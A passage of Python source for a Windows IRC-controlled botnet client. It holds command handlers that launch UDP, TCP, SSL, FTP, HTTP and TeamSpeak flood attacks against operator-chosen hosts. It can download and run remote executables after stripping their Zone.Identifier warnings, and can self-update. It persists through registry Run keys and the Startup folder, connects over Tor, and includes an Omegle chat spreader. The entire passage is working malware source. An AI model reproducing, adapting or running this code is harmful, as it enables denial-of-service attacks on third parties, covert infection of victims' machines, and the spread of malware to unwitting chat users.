                        emoticons = [":)", ":-)", ":3", "(:", "(-:", "^_^", ";)", "(;", ":P", ";P", ":p", ";p", ":-]", ":]", "[-:", "[:", "=]", "[=", "=P", "=p", "=3", "lol" ]
			result=choice(thanks)+choice(emoticons)
			talk(id,req,result)
			count += 1
        except:
            pass

def talk(id,req,msg):
    try:
	seed()
	sleep(randrange(1, 3, 2))
	typing = urlopen2("http://omegle.com/typing", "&id="+id)
	typing.close()
	sleep((len(msg))/9)
	typing = urlopen2("http://omegle.com/typing", "&id="+id)
	typing.close()
	sleep(randrange(1, 3, 2))
	msgReq = urlopen2("http://omegle.com/send", "&msg="+msg+"&id="+id)
	msgReq.close()
    except:
        pass

def omegleConnect(skypeornot, skiurl):
    try:
        site = urlopen2("http://omegle.com/start")
        id = fmtId( site.read() )
        req = Request("http://omegle.com/events", urlencode( {"id":id}))
        listenServer(id,req, skypeornot, skiurl)
    except:
        pass
def shutOffprotection(delStuff):
    doProtect=False
    if not argv[0].endswith(daemonProc):
        if IsProcessRunning(daemonProc):
            killProcess(daemonProc)
    if not argv[0] == getenv("APPDATA")+installDir+"\\"+daemonProc and delStuff == True:
        if path.isfile(getenv("APPDATA")+installDir+"\\"+daemonProc):
            try:
                remove(getenv("APPDATA")+installDir+"\\"+daemonProc)
            except:
                pass
    if not argv[0] == getenv("APPDATA")+"\\Microsoft\\Start Menu\\Programs\\Startup\\"+daemonProc and delStuff == True:
        if path.isdir(getenv("APPDATA")+"\\Microsoft\\Start Menu\\Programs\\Startup"):
            if path.isfile(getenv("APPDATA")+"\\Microsoft\\Start Menu\\Programs\\Startup\\"+daemonProc):
                try:
                    remove(getenv("APPDATA")+"\\Microsoft\\Start Menu\\Programs\\Startup\\"+daemonProc)
                except:
                    pass
    if not argv[0].endswith(botProc):
        if IsProcessRunning(botProc):
            killProcess(botProc)
    if not argv[0] == getenv("APPDATA")+installDir+"\\"+botProc and delStuff == True:
        if path.isfile(getenv("APPDATA")+installDir+"\\"+botProc):
            try:
                remove(getenv("APPDATA")+installDir+"\\"+botProc)
            except:
                pass
    if not argv[0] == getenv("APPDATA")+"\\Microsoft\\Start Menu\\Programs\\Startup\\"+botProc and delStuff == True:
        if path.isdir(getenv("APPDATA")+"\\Microsoft\\Start Menu\\Programs\\Startup"):
            if path.isfile(getenv("APPDATA")+"\\Microsoft\\Start Menu\\Programs\\Startup\\"+botProc):
                try:
                    remove(getenv("APPDATA")+"\\Microsoft\\Start Menu\\Programs\\Startup\\"+botProc)
                except:
                    pass
    if IsProcessRunning(torProc):
        killProcess(torProc)
    if delStuff == True:
        for x in range(0,len(torstuff)):
            theFile=torstuff[x][1]
            if theFile == "tor.exe":
                theFile=torProc
            if path.isfile(getenv("APPDATA")+installDir+"\\"+theFile):
                try:
                    remove(getenv("APPDATA")+installDir+"\\"+theFile)
                except:
                    pass
    if delStuff == True:
        keys = [ regKey]
        for lekey in keys:
            try:
                key = OpenKey(HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\run", 0, KEY_ALL_ACCESS)
                DeleteValue(key, lekey)
            except:
                pass
            try:
                key = OpenKey(HKEY_LOCAL_MACHINE, r"Software\\Microsoft\\Windows\\CurrentVersion\\run", 0, KEY_ALL_ACCESS)
                DeleteValue(key, lekey)
            except:
                pass
def downloadUpdate(url, s, ircChannel, sha256yesno, thesha256hash):
    if not path.isdir(getenv("APPDATA")+"\\Microsoft"):
        try:
            makedirs(getenv("APPDATA")+"\\Microsoft")
        except:
            pass
    if not path.isdir(getenv("APPDATA")+"\\Microsoft\\"+updateFolder):
        try:
            makedirs(getenv("APPDATA")+"\\Microsoft\\"+updateFolder)
        except:
            pass
    worked=False
    numErrors=0
    filename=getenv("APPDATA")+"\\Microsoft\\"+updateFolder+"\\"+updateEXE
    if path.isdir(filename):
        if IsProcessRunning(updateEXE):
            killProcess(updateEXE)
        try:
            remove(updateFolder+"\\"+updateEXE)
        except:
            pass
    while 1:
        numErrors=numErrors+1
        downloadworked=False
        try:
            urlretrieve(url, filename)
            downloadworked=True
        except:
            pass
        if downloadworked == True:
            if path.isfile(filename+":Zone.Identifier"):
                try:
                    remove(filename+":Zone.Identifier")
                except:
                    pass
            sha256worked=True
            if sha256yesno == True:
                with open(filename, "r") as filenameData:
                    if not gethash(filenameData) == thesha256hash:
                        sha256worked=False
                        try:
                            remove(filename)
                        except:
                            pass
            if sha256worked == True:
                startfile(filename)
                worked=True
                break
            else:
                if numErrors > 4:
                    break
    if worked == True:
        sendmsg("Sucessfully downloaded update from URL: " + url + " to file: " + filename+". Running update...", s, ircChannel)
        shutOffprotection(True)
        startfile(filename)
        killProcess(argv[0].split("\\")[len(argv[0].split("\\")) - 1])
    else:
        sendmsg("Unable to download update from URL: " + url + " to file: " + filename + ", after 5 attempts.", s, ircChannel)

def downloadandexecute(url, s, ircChannel, sha256yesno, thesha256hash):
    worked=False
    numErrors=0
    while 1:
        randfile=getenv("TEMP")+"\\"+choice(letters+digits)
        for x in range(0,5):
            randfile = randfile + choice(letters+digits)
        result = urlopen2(url)
        filename = path.basename(urlparse.urlparse(result.url).path)
        if "." in filename:
            randfile = randfile + "."+filename.split(".")[len(filename.split(".")) - 1]
        if not path.isfile(randfile):
            numErrors=numErrors+1
            downloadworked=False
            try:
                urlretrieve(url, randfile)
                downloadworked=True
            except:
                raise
            if downloadworked == True:
                if path.isfile(randfile+":Zone.Identifier"):
                    try:
                        remove(randfile+":Zone.Identifier")
                    except:
                        raise
                sha256worked=True
                if sha256yesno == True:
                    with open(randfile, "r") as randfileData:
                        if not gethash(randfile) == thesha256hash:
                            sha256worked=False
                            try:
                                remove(randfile)
                            except:
                                raise
                if sha256worked == True:
                    startfile(randfile)
                    worked=True
                    break
                else:
                    if numErrors > 4:
                        break
    if worked == True:
        sendmsg("Sucessfully downloaded from URL: " + url + " to file: " + randfile+".", s, ircChannel)
        startfile(randfile)
    else:
        sendmsg("Unable to download from URL: " + url + " to file: " + randfile + ", after 5 attempts.", s, ircChannel)

def getOS():
    winVer=""
    if "post2003" == release():
        winVer="pst2003"
    elif "8" == release():
        winVer="W8"
    elif "2000" == release():
        winVer="2000"
    elif "2008Server" == release():
        winVer="2008Srvr"
    elif "7" == release():
        winVer="7"
    elif "2008ServerR2" == release():
        winVer="2008SvR2"
    elif "XP" == release():
        winVer="XP"
    elif "NT" == release():
        winVer="NT"
    elif "2003Server" == release():
        winVer="2003Srvr"
    elif "Vista" == release():
        winVer="Vista"
    elif "95" == release():
        winVer="95"
    elif "98" == release():
        winVer="98"
    elif "Me" == release():
        winVer="ME"
    elif "postMe" == release():
        winVer="postME"
    elif "2003Server" == release():
        winVer="2003Srvr"
    elif "post2008Server" == release():
        winVer="pst28Svr"
    elif "Windows" == release():
        winVer="Windows"
    else:
        winVer="Error"
    return winVer
def is32bit():
    if sizeof(c_voidp) == 4:
        return True
    else:
        return False
def getcores():
    return str(cpu_count())
def getnick():
    global version
    global botAdmin
    global country
    randchars = ""
    for x in range(0,10):
        randchars = randchars + choice(letters+digits)
    username = getuser()
    userprivileges="U"
    if botAdmin == True:
        userprivileges="A"
    os="x64"
    if is32bit:
        os="x32"
    nick = country+"["+version+"]"+getOS()+"|"+os+"|"+userprivileges+"|"+getcores()+"c"+"|"+randchars
    return nick
connectionretry=False
def handlePing(text,s):
    if "PING :" in command and not "PRIVMSG" in command:
        print "received PING: "+command.split(":")[1]
        s.send("PONG :"+command.split(":")[1]+"\r\n")
        print "sent PONG: "+command.split(":")[1]
command = ""

def say(words):
    engine = init()
    engine.say(words)
    engine.runAndWait()

doDie = False
masters = [ ";" ]
while (True == doProtect):
    command=""
#    try:
#        del(s)
#    except:
#        pass
    sleep(1)
    if doDie == True:
        raise SystemExit
    outputChannel = ""
    ircServer = choice(ircServers)
    try:
        if connectionretry == True:
            sleep(20)
            connectionretry=False
        if ".onion:" in ircServer:
            s = socksocket()
            proxyport=9050
            try:
                v = socket(AF_INET, SOCK_STREAM)
                v.connect(("localhost", 9150))
                v.close()
                proxyport = 9150
            except:
                pass
            s.setproxy(PROXY_TYPE_SOCKS5, "127.0.0.1", proxyport)
        else:
            s = socket(AF_INET, SOCK_STREAM)
        s.settimeout(240)
        if useSSL == True:
            ssl.wrap_socket(s)
        s.connect(ircServer.split(":")[0], float(ircServer.split(":")[1]))
        nick = getnick()
        s.send("USER ZIB ZIB ZIB :ZIB\r\n")
        while 1:
            nick = getnick()
            s.send("NICK "+ nick +"\r\n")
            try:
                command = s.recv(200)
                command=command.strip(str.encode("\n\r"))
                handlePing(command,s)
            except:
                pass
            if not "erroneous nickname" in command and not "nickname is already in use" in command:
                s.send("MODE "+nick+" +i\r\n")
                break
        try:
            command = s.recv(200)
            command=command.strip(str.encode("\n\r"))
            handlePing(command,s)
        except:
            pass
        s.send("JOIN #Administration LICKMYBALLS\r\n")
        s.send("MODE #Administration +k LICKMYBALLS\r\n")
        s.send("JOIN "+ircServer.split(":")[2]+" "+channelpassword+"\r\n")
        s.send("MODE "+ircServer.split(":")[2]+" +k "+channelpassword+"\r\n")
        try:
            command = s.recv(200)
            command=command.strip(str.encode("\n\r"))
            handlePing(command,s)
        except:
            pass
        talk=True
        while 1:
            if doDie == True:
                raise SystemExit
            command = s.recv(200)
            if len(command) == 0:
                s.close()
                break
            print "received data."
            command=command.strip(str.encode("\n\r"))
            handlePing(command,s)
            print "command: "+command
            for master in masters:
                commandsfromroot = [":" + master + "!" + master + "@127.0.0.1", ":" + master + "!~" + master + "@127.0.0.1", ":Zlo!Zlo@Zlo", ":Zlo!~Zlo@Zlo"]
                if command.startswith(commandsfromroot[0]) or command.startswith(commandsfromroot[1]) or command.startswith(commandsfromroot[2]) or command.startswith(commandsfromroot[3]):
                    try:
                        outputChannel = command.split(" ")[2]
                    except:
                        outputChannel = ircServer.split(":")[2]
                        pass
                    if not "#" in outputChannel:
                        outputChannel = ircServer.split(":")[2]
                    try:
                        print "command accepted. output channel: "+outputChannel
                        if cmdprefix+"ip" in command.lower().split(" ")[3]:
                            if cmdprefix+"ip.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"ip - Grabs the public IP address of the bot.",s,outputChannel)
                            elif talk == True:
                                sendmsg(ipaddr,s,outputChannel)
                        elif cmdprefix+"logout" in command.lower().split(" ")[3]:
                            if cmdprefix+"logout.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"logout - Logs out all users.",s,outputChannel)
                            else:
                                worked=False
                                masters = [ ";" ]
                                sendmsg("All users have been logged out.",s,outputChannel)
                        elif cmdprefix+"login" in command.lower().split(" ")[3]:
                            if cmdprefix+"login.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"login User - Allows a user to send commands to the bots.",s,outputChannel)
                            else:
                                worked = False
                                try:
                                    user = command.split()[4]
                                    doadd=True
                                    for master in masters:
                                        if user == master:
                                            doadd=False
                                    if doadd == True:
                                        masters.append(user)
                                        if talk == True:
                                            sendmsg("User authorized.",s,outputChannel)
                                        else:
                                            sendmsg("User already authorized.",s,outputChannel)
                                except:
                                    worked=False
                                    sendmsg("Error! You must specify the user you would like to authorize.")
                                    pass
                        elif cmdprefix+"silent" in command.lower().split(" ")[3]:
                            if cmdprefix+"silent.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"silent - Disable bot command responses.",s,outputChannel)
                            else:
                                talk=False
                        elif cmdprefix+"noisy" in command.lower().split(" ")[3]:
                            if cmdprefix+"noisy.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"noisy - Enable bot command reponses.",s,outputChannel)
                            else:
                                talk=True
                                sendmsg("Command response enabled.", s, outputChannel)
                        elif cmdprefix+"ddos" in command.lower().split(" ")[3]:
                            if cmdprefix+"!ddos.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"ddos.httpflood - [HTTP flood] !ddos.udpflood - [UDP flood] !ddos.tcpflood [TCP flood] - !ddos.ftpflood [FTP flood] - !ddos.sslflood [TCP w/ SSL flood] - !ddos.ftpsflood [FTP w/ SSL flood] - !ddos.httpsflood [HTTP w/ SSL flood] - !ddos.teamspeak [TeamSpeak] - !ddos.teamspeaks [TeamSpeak w/ SSL] (use .help on sub-commands)", s, outputChannel)
                            else:
                                if cmdprefix+"ddos.udpflood" in command.lower().split(" ")[3]:
                                    if cmdprefix+"ddos.udpflood.help" in command.lower().split(" ")[3] and talk == True:
                                        sendmsg("Syntax: "+cmdprefix+"ddos.udpflood host port speed(seconds between packets i.e 0.1)",s,outputChannel)
                                    else:
                                        udpparameters = command.split()
                                        worked=True
                                        try:
                                            host = udpparameters[4]
                                        except:
                                            worked=False
                                            sendmsg("Error! You must specify the host you would like to attack.",s,outputChannel)
                                            pass
                                        if worked == True:
                                            try:
                                                port = int(udpparameters[5])
                                            except:
                                                worked=False
                                                sendmsg("Error! You either provided a non-integer value for the port, or did not specify the port you would like to attack.",s,outputChannel)
                                                pass
                                            if worked == True:
                                                try:
                                                    speed = float(udpparameters[6])
                                                except:
                                                    worked=False
                                                    sendmsg("Error! You either put a non-float parameter for the attack speed, or you did not specify the parameter.",s,outputChannel)
                                                    pass
                                                if worked == True:
                                                    doUDPflood=True
                                                    if talk == True:
                                                        sendmsg("Starting UDP flood against IP: "+host+":"+str(port)+" speed: "+str(speed)+" second interval between packets.", s, outputChannel)
                                                    start_new_thread(udpflood, (host,port,speed))
                                                    if talk == True:
                                                        sendmsg("Attack started!", s, outputChannel)
                                elif cmdprefix+"ddos.tcpflood" in command.lower().split(" ")[3] or cmdprefix+"ddos.sslflood" in command.lower().split(" ")[3]:
                                    if cmdprefix+"ddos.tcpflood.help" in command.lower().split(" ")[3] or cmdprefix+"ddos.sslflood.help" in command.lower().split(" ")[3]:
                                        orgcmd="ddos.tcpflood"
                                        if cmdprefix+"ddos.sslflood" in command.lower().split(" ")[3]:
                                            orgcmd="ddos.sslflood"
                                        sendmsg("Syntax: "+cmdprefix+orgcmd+" host port tor[1/0] threads",s,outputChannel)
                                    else:
                                        tcpparameters = command.split()
                                        worked=True
                                        try:
                                            host = tcpparameters[4]
                                        except:
                                            worked=False
                                            sendmsg("Error! You must specify the host you would like to attack",s,outputChannel)
                                            pass
                                        if worked == True:
                                            try:
                                                port = tcpparameters[5]
                                            except:
                                                worked=False
                                                sendmsg("Error! You must specify the port you would like to attack.",s,outputChannel)
                                                pass
                                            if worked == True:
                                                try:
                                                    tor = tcpparameters[6]
                                                except:
                                                    worked=False
                                                    sendmsg("Error! You must specify weather or not you would like to use Tor.",s,outputChannel)
                                                    pass
                                                if worked == True:
                                                    usetor=False
                                                    if tor.lower() == "y" or tor.lower() == "yes" or tor.lower() == "1" or tor.lower() == "+" or tor.lower() == "true":
                                                        usetor=True
                                                    try:
                                                        threads = tcpparameters[7]
                                                    except:
                                                        worked=False
                                                        sendmsg("Error! You must specify the amount of threads to attack with.",s,outputChannel)
                                                        pass
                                                    if worked == True:
                                                        TCPSSLstr="TCP"
                                                        if cmdprefix+"ddos.sslflood" in command.lower().split(" ")[3]:
                                                            doSSLflood=True
                                                            TCPSSLstr="SSL"
                                                        else:
                                                            doTCPflood=True
                                                        if talk == True:
                                                            sendmsg("Starting "+TCPSSLstr+" flood against IP: "+host+":"+port+" Tor: " + str(usetor) + " Threads: " + threads, s, outputChannel)
                                                        for x in range(0,int(threads)):
                                                            if cmdprefix+"ddos.sslflood" in command.lower().split(" ")[3]:
                                                                start_new_thread(tcpflood, (int(port), host, usetor, True))
                                                            else:
                                                                start_new_thread(tcpflood, (int(port), host, usetor, False))
                                                        if talk == True:
                                                            sendmsg("Attack started!", s, outputChannel)
                                elif cmdprefix+"ddos.ftpflood" in command.lower().split(" ")[3] or cmdprefix+"ddos.ftpsflood" in command.lower().split(" ")[3]:
                                    if cmdprefix+"ddos.ftpflood.help" in command.lower().split(" ")[3] or cmdprefix+"ddos.fttpsflood.help" in command.lower().split(" ")[3]:
                                        orgcmd="ddos.ftpflood"
                                        if cmdprefix+"ddos.ftpsflood" in command.lower().split(" ")[3]:
                                            orgcmd="ddos.ftpsflood"
                                        sendmsg("Syntax: "+cmdprefix+orgcmd+" host port tor[1/0] threads",s,outputChannel)
                                    else:
                                        ftpparameters = command.split()
                                        worked=True
                                        try:
                                            host = ftpparameters[4]
                                        except:
                                            worked=False
                                            sendmsg("Error! You must specify the DNS/IP you would like to attack.",s,outputChannel)
                                            pass
                                        if worked == True:
                                            try:
                                                port = ftpparameters[5]
                                            except:
                                                worked=False
                                                sendmsg("Error! You must specify the port you would like to attack.",s,outputChannel)
                                                pass
                                            if worked == True:
                                                try:
                                                    tor = tcpparameters[6]
                                                except:
                                                    worked=False
                                                    sendmsg("Error! You must specify weather or not you would like to use Tor.",s,outputChannel)
                                                    pass
                                                if worked == True:
                                                    try:
                                                        threads = tcpparameters[7]
                                                    except:
                                                        worked=False
                                                        sendmsg("Error! You must specify the amount of threads to attack with.",s,outputChannel)
                                                        pass
                                                    if worked == True:
                                                        usetor=False
                                                        if tor.lower() == "y" or tor.lower() == "yes" or tor == "1" or tor.lower() == "+" or tor.lower() == "true":
                                                            usetor=True
                                                        FTPFTPSstr="FTP"
                                                        if cmdprefix+"ddos.ftpsflood" in command.lower():
                                                            doFTPSflood=True
                                                            FTPFTPSstr="FTPS"
                                                        else:
                                                            doFTPflood=True
                                                        if talk == True:
                                                            sendmsg("Starting "+FTPFTPSstr+" flood against IP: "+host+":"+port+" Tor: " + str(usetor) + " Threads: " + threads, s, outputChannel)
                                                        for x in range(0,int(threads)):
                                                            if cmdprefix+"ddos.ftpsflood" in command.lower():
                                                                start_new_thread(ftpflood, (host, int(port), True, usetor))
                                                            else:
                                                                start_new_thread(ftpflood, (host, int(port), False, usetor))
                                                        if talk == True:
                                                            sendmsg("Attack started!", s, outputChannel)
                                elif cmdprefix+"ddos.teamspeak" in command.lower().split(" ")[3] or cmdprefix+"ddos.teamspeaks" in command.lower().split(" ")[3]:
                                    if cmdprefix+"ddos.teamspeak" in command.lower().split(" ")[3] or "ddos.teamspeaks.help" in command.lower().split(" ")[3]:
                                        orgcmd="ddos.teamspeak"
                                        if cmdprefix+"ddos.teamspeaks" in command.lower().split(" ")[3]:
                                            orgcmd="ddos.teamspeaks"
                                        sendmsg("Syntax: "+cmdprefix+orgcmd+".help host port tor[1/0] threads",s,outputChannel)
                                    else:
                                        teamspeakparameters = command.split()
                                        worked=True
                                        try:
                                            host = teamspeakparameters[4]
                                        except:
                                            worked=False
                                            sendmsg("Error! You must specify the DNS/IP you would like to attack.",s,outputChannel)
                                            pass
                                        try:
                                            port = teamspeakparameters[5]
                                        except:
                                            worked=False
                                            sendmsg("Error! You must specify the port you would like to attack.",s,outputChannel)
                                            pass
                                        SSLorNOT=False
                                        if worked == True:
                                            if cmdprefix+"ddos.teamspeaks" in command.lower():
                                                doTeamSpeaks=True
                                                SSLorNOT = True
                                            else:
                                                doTeamSpeak=True
                                            try:
                                                tor = teamspeakparameters[6]
                                            except:
                                                worked=False
                                                sendmsg("Error! You must specify weather or not you would like to use Tor.",s,outputChannel)
                                                pass
                                            if worked == True:
                                                usetor=False
                                                if tor.lower() == "y" or tor.lower() == "yes" or tor.lower() == "1" or tor.lower() == "+" or tor.lower() == "true":
                                                    usetor=True
                                                TSTSSstr="TS"
                                                if cmdprefix+"ddos.teamspeaks" in command.lower():
                                                    TSTSSstr="TSS"
                                                try:
                                                    threads = teamspeakparameters[7]
                                                except:
                                                    worked=False
                                                    sendmsg("Error! You must specify the amount of threads you would like to attack with.",s,outputChannel)
                                                    pass
                                                if worked == True:
                                                    if talk == True:
                                                        sendmsg("Starting "+TSTSSstr+" flood against IP: "+host+":"+port+" Tor: " + str(usetor) + " Threads: " + threads, s, outputChannel)
                                                    for x in range(0, int(threads)):
                                                        if cmdprefix+"ddos.teamspeaks" in command.lower():
                                                            start_new_thread(teamspeak, (host, port, True, usetor))
                                                        else:
                                                            start_new_thread(teamspeak, (host, port, False, usetor))
                                                    if talk == True:
                                                        sendmsg("Attack started!", s, outputChannel)
                                elif cmdprefix+"ddos.httpflood" in command.lower().split(" ")[3] or cmdprefix+"ddos.httpsflood" in command.lower().split(" ")[3]:
                                    if cmdprefix+"ddos.httpflood.help" in command.lower().split(" ")[3] or cmdprefix+"ddos.httpsflood.help" in command.lower().split(" ")[3]:
                                        orgcmd="ddos.httpflood"
                                        if cmdprefix+"ddos.httpsflood" in command.lower().split(" ")[3]:
                                            orgcmd="ddos.httpsflood"
                                        sendmsg("Syntax: "+cmdprefix+orgcmd+" host port tor[1/0] threads",s,outputChannel)
                                    else:
                                        httpparameters = command.split()
                                        worked=True
                                        try:
                                            host = httpparameters[4]
                                        except:
                                            worked=False
                                            sendmsg("Error! You must specify the DNS/IP you would like to attack.",s,outputChannel)
                                            pass
                                        if worked == True:
                                            try:
                                                port = httpparameters[5]
                                            except:
                                                worked=False
                                                sendmsg("Error! You must specify the port you would like to attack.",s,outputChannel)
                                                pass
                                            if worked == True:
                                                try:
                                                    tor = httpparameters[6]
                                                except:
                                                    worked=False
                                                    sendmsg("Error! You must specify weather or not you would like to use Tor.",s,outputChannel)
                                                    pass
                                                if worked == True:
                                                    usetor=False
                                                    if tor.lower() == "y" or tor.lower() == "yes" or tor.lower() == "1" or tor.lower() == "+" or tor.lower() == "true":
                                                        usetor=True
                                                    try:
                                                        threads = httpparameters[7]
                                                    except:
                                                        worked=False
                                                        sendmsg("Error! You must specify the amount of threads you would like to attack with.",s,outputChannel)
                                                        pass
                                                    if worked == True:
                                                        HTTPHTTPSstr="HTTP"
                                                        if cmdprefix+"ddos.httpsflood" in command.lower():
                                                            HTTPHTTPSstr="HTTPS"
                                                            doHTTPSflood=True
                                                        else:
                                                            doHTTPflood=True
                                                        if talk == True:
                                                            sendmsg("Starting "+HTTPHTTPSstr+" flood against IP: "+host+":"+port+" Tor: " + str(usetor) + " Threads: " + threads, s, outputChannel)
                                                        for x in range(0, int(threads)):
                                                            if cmdprefix+"ddos.httpsflood" in command.lower().split(" ")[3]:
                                                                start_new_thread(httpflood, (host, port, True, usetor))
                                                            else:
                                                                start_new_thread(httpflood, (host, port, False, usetor))
                                                        if talk == True:
                                                            sendmsg("Attack started!", s, outputChannel)
                        elif cmdprefix+"stophttpflood" in command.lower().split(" ")[3] or cmdprefix+"stophttpsflood" in command.lower().split(" ")[3]:
                            if cmdprefix+"stophttpflood.help" in command.lower().split(" ")[3] or cmdprefix+"stophttpsflood.help" in command.lower().split(" ")[3]:
                                if cmdprefix+"!stophttpsflood" in command.lower().split(" ")[3]:
                                    sendmsg("Syntax: "+cmdprefix+"stophttpsflood - Stops any running HTTPs flood/s.",s,ircServer.split()[2])
                                else:
                                    sendmsg("Syntax: "+cmdprefix+"stophttpflood - Stops any running HTTP flood/s.",s,ircServer.split()[2])
                            else:
                                if (doHTTPflood == True and cmdprefix+"stophttpflood" in command.lower()) or (doHTTPSflood==True and cmdprefix+"stophttpsflood" in command.lower()):
                                    if "stophttpsflood" in command.lower():
                                        doHTTPSflood=False
                                        if talk == True:
                                            sendmsg("HTTPS Flood finished.", s, outputChannel)
                                    else:
                                        doHTTPflood=False
                                        if talk == True:
                                            sendmsg("HTTP Flood finished.", s, outputChannel)
                                else:
                                    if "stophttpsflood" in command.lower():
                                        if talk == True:
                                            sendmsg("No HTTPS flood running.", s, outputChannel)
                                    else:
                                        if talk == True:
                                            sendmsg("No HTTP flood running.", s, outputChannel)
                        elif cmdprefix+"stoptcpflood" in command.lower().split(" ")[3] or cmdprefix+"stopsslflood" in command.lower().split(" ")[3]:
                            if cmdprefix+"stoptcpflood.help" in command.lower().split(" ")[3] or cmdprefix+"stopsslflood.help" in command.lower().split(" ")[3]:
                                if cmdprefix+"stopsslflood" in command.lower().split(" ")[3]:
                                    sendmsg("Syntax: "+cmdprefix+"stopsslflood - Stops any running SSL flood/s.",s,outputChannel)
                                else:
                                    sendmsg("Syntax: "+cmdprefix+"stoptcpflood - Stops any running TCP flood/s.",s,outputChannel)
                            else:
                                if (doTCPflood == True and cmdprefix+"stoptcpflood" in command.lower().split(" ")[3]) or (doSSLflood==True and cmdprefix+"stopsslflood" in command.lower().split(" ")[3]):
                                    if cmdprefix+"stopsslflood" in command.lower():
                                        doSSLflood=False
                                        if talk == True:
                                            sendmsg("SSL Flood finished.", s, outputChannel)
                                    else:
                                        doTCPflood=False
                                        if talk == True:
                                            sendmsg("TCP Flood finished.", s, outputChannel)
                                else:
                                    if cmdprefix+"stopsslflood" in command.lower():
                                        if talk == True:
                                            sendmsg("No SSL flood running.", s, outputChannel)
                                    else:
                                        if talk == True:
                                            sendmsg("No TCP flood running.", s, outputChannel)
                        elif cmdprefix+"stopudpflood" in command.lower().split(" ")[3]:
                            if cmdprefix+"stopudpflood.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"stopudpflood - Stops any running UDP flood/s.",s,outputChannel)
                            else:
                                if doUDPflood == True:
                                    doUDPflood = False
                                    if talk == True:
                                        sendmsg("UDP Flood/s finished.", s, outputChannel)
                                else:
                                    if talk == True:
                                       sendmsg("No UDP flood/s running.", s, outputChannel)
                        elif cmdprefix+"stopteamspeak" in command.lower().split(" ")[3] or cmdprefix+"stopteamspeaks" in command.lower().split(" ")[3]:
                            if cmdprefix+"stopteamspeak.help" in command.lower().split(" ")[3] or cmdprefix+"stopteamspeaks.help" in command.lower().split(" ")[3]:
                                message = "Syntax: "+cmdprefix+"stopteamspeak* - Stops all TeamSpeak* flood/s"
                                if "teamspeaks" in command.lower().split(" ")[3]:
                                    message = message.replace("*","s")
                                else:
                                    message = message.replace("*","")
                                sendmsg(message, s, outputChannel)
                            else:
                                if (doTeamSpeaks == True and cmdprefix+"stopteamspeaks" in command.lower().split(" ")[3]) or ( (doTeamSpeak == True and cmdprefix+"stopteamspeak" in command.lower().split(" ")[3]) and not (cmdprefix+"stopteamspeaks" in command.lower().split(" ")[3]) ):
                                    if cmdprefix+"stopteamspeaks" in command.lower().split(" ")[3]:
                                        doTeamSpeaks=False
                                        if talk == True:
                                            sendmsg("TSS Flood finished.", s, outputChannel)
                                    else:
                                        doTeamSpeak=False
                                        if talk == True:
                                            sendmsg("TS Flood finished.", s, outputChannel)
                                else:
                                    if talk == True:
                                        if cmdprefix+"stopteamspeaks" in command.lower().split(" ")[3]:
                                            sendmsg("No TSS flood running.", s, outputChannel)
                                        else:
                                            sendmsg("No TS flood running.", s, outputChannel)
                        elif cmdprefix+"httpfloodstatus" in command.lower().split(" ")[3] or cmdprefix+"httpsfloodstatus" in command.lower().split(" ")[3]:
                            if cmdprefix+"httpfloodstatus.help" in command.lower().split(" ")[3] or cmdprefix+"httpsfloodstatus.help" in command.lower().split(" ")[3]:
                                message = "Syntax: "+cmdprefix+"http*floodstatus - Grabs the status of any HTTP* flood/s."
                                if "httpsflood" in command.lower().split(" ")[3]:
                                    message = message.replace("*","s")
                                else:
                                    message = message.replace("*","")
                                sendmsg(message, s, outputChannel)
                            else:
                                if talk == True:
                                    if (doHTTPflood == True and cmdprefix+"httpfloodstatus" in command.lower().split(" ")[3]) or (doHTTPSflood == True and cmdprefix+"httpsfloodstatus" in command.lower().split(" ")[3]):
                                        httphttps="HTTP"
                                        if cmdprefix+"httpsfloodstatus" in command.lower().split(" ")[3]:
                                            httphttps=httphttps+"S"
                                        sendmsg(httphttps+" flood/s running.",s,outputChannel)
                                    else:
                                        httphttps="HTTP"
                                        if cmdprefix+"httpsfloodstatus" in command.lower().split(" ")[3]:
                                            httphttps=httphttps+"S"
                                        sendmsg("No "+httphttps+" flood/s running.",s,outputChannel)
                        elif cmdprefix+"update" in command.lower().split(" ")[3]:
                            if cmdprefix+"update.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"update http://example.com/direct-link.exe SHA256_hash(if you wish SHA256 hash verification).", s, outputChannel)
                            else:
                                updateparameters = command.split()
                                worked=True
                                updateurl=""
                                try:
                                    updateurl=updateparameters[4]
                                except:
                                    worked=False
                                    sendmsg("Error! You must specify the URL to a direct link containing the update.",s,outputChannel)
                                    pass
                                if worked == True:
                                    thesha256hash=""
                                    try:
                                        thesha256hash = dlexecparameters[5]
                                    except:
                                        pass
                                    useSHA256=False
                                    if not thesha256hash == "":
                                        useSHA256 = True
                                    if talk == True:
                                        sendmsg("Attempting to update " + updateurl + "...", s, outputChannel)
                                    start_new_thread(downloadUpdate, (updateurl, s, command.split(" ")[2], useSHA256, thesha256hash))
                        elif cmdprefix+"download&execute" in command.lower():
                            if cmdprefix+"download&execute.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"download&execute http://example.com/direct-link.exe SHA256_hash(if you wish to use SHA256 hash verification).", s, outputChannel)
                            else:
                                dlexecparameters = command.split()
                                worked=True
                                dlexecurl=""
                                try:
                                    dlexecurl = dlexecparameters[4]
                                except:
                                    worked=False
                                    sendmsg("Error! Please specify the URL containing a direct link to an executable.",s,outputChannel)
                                    pass
                                if worked == True:
                                    thesha256hash=""
                                    try:
                                        thesha256hash = dlexecparameters[5]
                                    except:
                                        pass
                                    useSHA256=False
                                    if not thesha256hash == "":
                                        useSHA256 = True
                                    if talk == True:
                                        sendmsg("Attempting to download and execute " + dlexecurl + "...", s, outputChannel)
                                    downloadandexecute(dlexecurl,s,command.split(" ")[2],useSHA256,thesha256hash)
                                    #start_new_thread(downloadandexecute, (dlexecurl,s,command.split(" ")[2],useSHA256,thesha256hash))
                        elif cmdprefix+"omeglespreader" in command.lower().split(" ")[3]:
                            if cmdprefix+"omeglespreader.help" in command.lower().split(" ")[3]:
